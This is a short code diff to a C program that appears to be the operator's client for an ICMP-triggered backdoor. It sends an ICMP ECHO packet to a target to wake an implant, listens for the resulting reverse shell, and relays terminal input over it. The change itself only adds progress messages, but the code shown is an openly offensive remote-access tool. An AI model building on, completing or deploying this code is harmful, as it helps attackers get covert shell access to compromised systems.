@@ -57,6 +57,8 @@ int main(int argc, char *argv[]) {
     }
     listen(s, 4);
 
+    printf("[*] Sending ICMP ECHO packet to target\n");
+
     /* Send ICMP ECHO to trigger reverse shell */
     if (send_icmp(argv) < 0) {
         printf("Error: failed to send ICMP packet\n");
@@ -64,12 +66,15 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
+    printf("[*] Waiting for reverse shell connection\n");
+
     /* Accept reverse shell connection */
     if ((c = accept(s, (struct sockaddr *) &accept_addr, &b)) < 0) {
         perror("accept");
         return 1;
     }
 
+    printf("[+] Reverse shell connection received!\n");
     struct pollfd fds[2] = {
         {
             .fd = STDIN_FILENO,
